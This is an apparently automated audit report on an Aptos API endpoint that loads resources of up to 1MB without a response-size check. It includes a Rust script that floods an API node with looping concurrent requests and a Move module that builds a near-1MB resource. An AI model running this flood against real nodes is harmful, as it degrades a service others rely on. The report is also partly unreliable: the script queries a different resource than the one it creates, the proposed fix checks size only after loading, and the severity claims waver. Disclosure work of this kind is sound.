# Audit Report

## Title
API Resource Retrieval Lacks Response Size Validation Leading to Memory Exhaustion DoS

## Summary
The `/accounts/:address/resource/:resource_type` endpoint in `api/src/state.rs` retrieves resources from storage without validating their size before loading into memory and returning to clients. While storage-layer limits cap individual resources at 1MB, the API lacks response-level size checks, allowing attackers to cause memory exhaustion through concurrent queries of maximum-sized resources.

## Finding Description

The `resource()` function retrieves account resources without any size validation at the API layer. [1](#0-0) 

The resource bytes are retrieved from storage via `find_resource()` which simply fetches the raw bytes. [2](#0-1) 

The underlying `get_state_value_bytes()` method loads the entire resource into memory without size checks. [3](#0-2) 

For BCS responses, the full byte vector is returned directly. [4](#0-3) 

The `try_from_encoded()` method wraps the bytes without size validation. [5](#0-4) 

While storage enforces a 1MB per-write-op limit at gas feature version 3+, [6](#0-5)  resources written before this version had unlimited size, [7](#0-6)  and the API layer performs no independent size checking.

The API only enforces POST request size limits, not response sizes. [8](#0-7) 

**Attack Path:**
1. Attacker creates account(s) with resources at maximum allowed size (~1MB)
2. Sends concurrent GET requests to `/accounts/:address/resource/:resource_type`
3. Each request loads 1MB into API server memory
4. With default thread pool (2× CPU cores, e.g., 16 threads on 8-core), sustained concurrent requests amplify memory consumption
5. Thousands of requests exhaust available memory, causing API crashes or severe slowdowns

## Impact Explanation

This vulnerability enables **API crashes** and **validator node slowdowns**, which qualify as **High Severity** per the Aptos Bug Bounty program (up to $50,000). 

While individual resources are capped at 1MB by storage limits (not "gigabytes" as the security question suggests), an attacker can:
- Send hundreds of concurrent requests, each loading 1MB
- Exhaust server memory through sustained attack
- Cause API service degradation or crashes
- Potentially impact validator node operation if API shares resources

The framework even acknowledges this concern, noting the 1MB limit exists specifically because it's "a bit less than half of the resource limit." [9](#0-8) 

## Likelihood Explanation

**Likelihood: High**

The attack is trivially exploitable:
- No authentication required beyond standard HTTP access
- Attacker can create their own accounts with maximum-size resources
- Standard HTTP load testing tools can generate concurrent requests
- No rate limiting observed on resource endpoints
- API server has finite memory shared with other operations

Large resource examples exist in the codebase, demonstrating feasibility of creating near-1MB resources. [10](#0-9) 

## Recommendation

Implement response size validation at the API layer:

```rust
// In api/src/state.rs, resource() function
const MAX_RESOURCE_RESPONSE_SIZE: usize = 1024 * 1024; // 1MB

fn resource(
    &self,
    accept_type: &AcceptType,
    address: Address,
    resource_type: MoveStructTag,
    ledger_version: Option<u64>,
) -> BasicResultWith404<MoveResource> {
    // ... existing code ...
    
    let bytes = state_view
        .as_converter(self.context.db.clone(), self.context.indexer_reader.clone())
        .find_resource(&state_view, address, &tag)
        .context(format!(...))
        .map_err(|err| ...)?
        .ok_or_else(|| ...)?;
    
    // Add size validation
    if bytes.len() > MAX_RESOURCE_RESPONSE_SIZE {
        return Err(BasicErrorWith404::bad_request_with_code(
            format!("Resource size {} exceeds maximum allowed size {}", 
                    bytes.len(), MAX_RESOURCE_RESPONSE_SIZE),
            AptosErrorCode::InvalidInput,
            &ledger_info,
        ));
    }
    
    // ... rest of function ...
}
```

Additionally:
1. Add rate limiting middleware to resource endpoints
2. Consider configurable response size limits via `ApiConfig`
3. Add monitoring/metrics for large resource queries
4. Document size limits in API specification

## Proof of Concept

```rust
// Rust load test demonstrating memory exhaustion
use std::thread;
use std::sync::Arc;
use reqwest::blocking::Client;

fn main() {
    // Assume attacker has created account 0xATTACKER with a ~1MB resource
    let client = Arc::new(Client::new());
    let url = "http://api-node:8080/v1/accounts/0xATTACKER/resource/0x1::account::Account";
    
    let mut handles = vec![];
    
    // Spawn 100 concurrent requests
    for _ in 0..100 {
        let client = Arc::clone(&client);
        let url = url.to_string();
        
        let handle = thread::spawn(move || {
            loop {
                // Continuous requests to exhaust memory
                let _ = client.get(&url).send();
            }
        });
        handles.push(handle);
    }
    
    // Monitor memory usage - API server memory should grow unbounded
    for handle in handles {
        handle.join().unwrap();
    }
}
```

```move
// Move module to create maximum-size resource
module attacker::large_resource {
    use std::vector;
    
    struct LargeData has key {
        // Create vector approaching 1MB limit
        data: vector<u8>
    }
    
    public entry fun create_large_resource(account: &signer) {
        let data = vector::empty<u8>();
        let i = 0;
        // Fill with ~1MB of data
        while (i < 1000000) {
            vector::push_back(&mut data, 0u8);
            i = i + 1;
        };
        move_to(account, LargeData { data });
    }
}
```

**Notes**

The security question asks about "gigabytes in size" resources, but storage-layer enforcement limits individual resources to 1MB maximum (gas feature version 3+). However, the vulnerability remains valid because:

1. The API performs no size validation before loading resources into memory
2. Concurrent requests amplify memory consumption (100 requests × 1MB = 100MB)
3. Legacy resources from pre-version-3 could theoretically exceed 1MB
4. The lack of response size limits violates the "Resource Limits" invariant

While less severe than gigabyte-sized resources, this still constitutes a valid Medium-to-High severity DoS vulnerability enabling API crashes and node slowdowns.

### Citations

**File:** api/src/state.rs (L289-304)
```rust
        let bytes = state_view
            .as_converter(self.context.db.clone(), self.context.indexer_reader.clone())
            .find_resource(&state_view, address, &tag)
            .context(format!(
                "Failed to query DB to check for {} at {}",
                tag.to_canonical_string(),
                address
            ))
            .map_err(|err| {
                BasicErrorWith404::internal_with_code(
                    err,
                    AptosErrorCode::InternalError,
                    &ledger_info,
                )
            })?
            .ok_or_else(|| resource_not_found(address, &tag, ledger_version, &ledger_info))?;
```

**File:** api/src/state.rs (L322-327)
```rust
            AcceptType::Bcs => BasicResponse::try_from_encoded((
                bytes.to_vec(),
                &ledger_info,
                BasicResponseStatus::Ok,
            )),
        }
```

**File:** api/types/src/convert.rs (L112-134)
```rust
    pub fn find_resource(
        &self,
        state_view: &impl StateView,
        address: Address,
        tag: &StructTag,
    ) -> Result<Option<Bytes>> {
        Ok(match self.inner.view_resource_group_member(tag) {
            Some(group_tag) => {
                let key = StateKey::resource_group(&address.into(), &group_tag);
                match state_view.get_state_value_bytes(&key)? {
                    Some(group_bytes) => {
                        let group: BTreeMap<StructTag, Bytes> = bcs::from_bytes(&group_bytes)?;
                        group.get(tag).cloned()
                    },
                    None => None,
                }
            },
            None => {
                let key = StateKey::resource(&address.into(), tag)?;
                state_view.get_state_value_bytes(&key)?
            },
        })
    }
```

**File:** types/src/state_store/mod.rs (L72-75)
```rust
    fn get_state_value_bytes(&self, state_key: &Self::Key) -> StateViewResult<Option<Bytes>> {
        let val_opt = self.get_state_value(state_key)?;
        Ok(val_opt.map(|val| val.bytes().clone()))
    }
```

**File:** api/src/response.rs (L494-508)
```rust
            pub fn try_from_encoded<E: $crate::response::InternalError>(
                (value, ledger_info, status): (
                    Vec<u8>,
                    &aptos_api_types::LedgerInfo,
                    [<$enum_name Status>],
                ),
            ) -> Result<Self, E> {
               Ok(Self::from((
                    $crate::bcs_payload::Bcs(
                        value
                    ),
                    ledger_info,
                    status
               )))
            }
```

**File:** aptos-move/aptos-vm-types/src/storage/change_set_configs.rs (L20-28)
```rust
    pub fn unlimited_at_gas_feature_version(gas_feature_version: u64) -> Self {
        Self::new_impl(
            gas_feature_version,
            u64::MAX,
            u64::MAX,
            u64::MAX,
            u64::MAX,
            u64::MAX,
        )
```

**File:** aptos-move/aptos-vm-types/src/storage/change_set_configs.rs (L68-72)
```rust
    fn for_feature_version_3() -> Self {
        const MB: u64 = 1 << 20;

        Self::new_impl(3, MB, u64::MAX, MB, 10 * MB, u64::MAX)
    }
```

**File:** config/src/config/api_config.rs (L29-31)
```rust
    /// A maximum limit to the body of a POST request in bytes
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub content_length_limit: Option<u64>,
```

**File:** aptos-move/framework/aptos-framework/sources/datastructures/big_ordered_map.move (L18-22)
```text
/// Note: Default configuration (used in `new_with_config(0, 0, false)`) allows for keys and values of up to 5KB,
/// or 100 times the first (key, value), to satisfy general needs.
/// If you need larger, use other constructor methods.
/// Based on initial configuration, BigOrderedMap will always accept insertion of keys and values
/// up to the allowed size, and will abort with EKEY_BYTES_TOO_LARGE or EARGUMENT_BYTES_TOO_LARGE.
```

**File:** aptos-move/framework/aptos-framework/sources/datastructures/big_ordered_map.move (L94-97)
```text
    /// Largest size all keys for inner nodes or key-value pairs for leaf nodes can have.
    /// Node itself can be a bit larger, due to few other accounting fields.
    /// This is a bit conservative, a bit less than half of the resource limit (which is 1MB)
    const MAX_NODE_BYTES: u64 = 400 * 1024;
```
